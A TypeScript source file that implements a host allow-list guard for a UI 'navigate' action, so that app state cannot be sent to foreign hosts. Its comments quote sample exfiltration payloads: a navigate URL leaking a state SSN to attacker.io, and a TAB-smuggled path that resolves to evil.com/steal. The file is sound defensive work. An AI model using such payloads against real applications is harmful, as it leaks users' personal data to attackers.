// navigate.ts — where a `navigate` action is allowed to send the user.
//
// safeHref (url.ts) blocks dangerous SCHEMES — javascript:, data:, protocol-relative
// //host — but passes ANY https DESTINATION unchanged. That is correct for a link an
// author typed. It is NOT sufficient for a `navigate` ACTION, which can carry state:
//
//     navigate("https://attacker.io/?d={{state.ssn}}")
//     safeHref(that)  ->  returned UNCHANGED   (governance-gate.mjs G5)
//
// safeHref cannot see this: the scheme is https, the payload is a query string. The
// exfiltration channel is the DESTINATION, not the scheme.
//
// safeNavigate enforces WHERE data may go. An absolute or protocol-relative URL must
// target an allow-listed host or it is blocked. Same-origin targets (fragment, query,
// relative path) carry no data to a foreign host and are allowed. The allow-list is
// the SAME concept atomkit-http enforces for `call` (its SSRF host allow-list); the
// `hostAllowed` semantics are re-implemented here byte-for-byte because core must not
// depend on the http package, and cross-checked in spike/g5-safe-navigate.mjs.

/**
 * Host allow-list check. Mirrors @noidmejs/atomkit-http's `hostAllowed`: an entry
 * "app.example.com" matches that exact host; a leading-dot entry ".example.com"
 * matches example.com and any subdomain. Case-insensitive.
 */
export function isHostAllowed(host: string, allow: string[]): boolean {
  const h = host.toLowerCase();
  return allow.some((a) => {
    const s = a.toLowerCase();
    return s.startsWith('.') ? h === s.slice(1) || h.endsWith(s) : h === s;
  });
}

export interface NavigatePolicy {
  /** Allow-listed destination hosts — exact ("app.x.com") or suffix (".x.com"). An
   *  empty list blocks every cross-origin destination (same-origin still works). */
  allowHosts: string[];
  /** Permit mailto: targets. Default false — a mailto body/subject carries data
   *  off-origin to an arbitrary address. Opt in for "email us" links. */
  allowMailto?: boolean;
  /** Permit tel: targets. Default false. */
  allowTel?: boolean;
  /** Max source length. Default 2048 (matches safeHref). */
  maxLength?: number;
}

/**
 * Guard a `navigate` action's destination. Returns a safe href string, or `null` to
 * block — the caller renders a no-op (or "#") and MUST NOT navigate.
 *
 * Decisions, and why:
 *   - fragment  "#sec"          ALLOW  — same document, no network request at all.
 *   - query     "?q=1"          ALLOW  — same origin + path; the data goes to your own
 *                                        server, which already holds the state.
 *   - abs path  "/x"            ALLOW  — same origin. "//host" and "/\host" are NOT
 *                                        paths (protocol-relative) and fall through.
 *   - relative  "./x" "../x"    ALLOW  — same origin.
 *   - mailto:/tel:              BLOCK unless opted in — off-device data channels.
 *   - http(s)://host, //host    ALLOW iff host is allow-listed; else BLOCK.
 *   - anything else             BLOCK  — javascript:, data:, file:, vbscript:, and a
 *                                        bare "host/path" (no scheme, ambiguous) all
 *                                        fail closed. Write "/path" or an explicit
 *                                        scheme instead.
 */
export function safeNavigate(url: unknown, policy: NavigatePolicy): string | null {
  if (typeof url !== 'string') return null;
  const s = url.trim();
  if (!s) return null;
  if (s.length > (policy.maxLength ?? 2048)) return null;

  // Reject C0 controls and DEL ANYWHERE in the string, BEFORE any same-origin fast
  // path. The URL parser *removes* TAB, LF and CR, so a target beginning with a slash
  // and a TAB looks like a same-origin absolute path to a prefix check, while a real
  // browser resolves it cross-origin:
  //     new URL('/<TAB>/evil.com/steal', 'https://app.example.com').href
  //       -> 'https://evil.com/steal'
  // A legitimate navigation target never contains a control character; percent-encode it.
  if (/[\u0000-\u001F\u007F]/.test(s)) return null;

  // Same-document / same-origin, no host component → cannot exfiltrate cross-origin.
  if (s.startsWith('#')) return s; // fragment
  if (s.startsWith('?')) return s; // query on the current path
  // "/path" is a same-origin absolute path. "//host" and "/\host" are protocol-
  // relative (cross-origin) and must NOT be treated as a relative path.
  if (/^\/(?![/\\])/.test(s)) return s;
  if (/^\.\.?\//.test(s)) return s; // "./x" or "../x"

  const lower = s.toLowerCase();
  if (lower.startsWith('mailto:')) return policy.allowMailto ? s : null;
  if (lower.startsWith('tel:')) return policy.allowTel ? s : null;

  // Everything else must present a parseable http(s) host that is allow-listed.
  // A protocol-relative "//host/..." is resolved against an https base to read the
  // host; the ORIGINAL string is returned unchanged when allowed.
  let host: string;
  try {
    const u = s.startsWith('//') ? new URL('https:' + s) : new URL(s);
    if (u.protocol !== 'https:' && u.protocol !== 'http:') return null;
    host = u.hostname.toLowerCase(); // authoritative: ignores userinfo ("a@evil.com")
  } catch {
    return null; // unparseable, incl. bare "host/path" without a scheme → block
  }
  return isHostAllowed(host, policy.allowHosts) ? s : null;
}
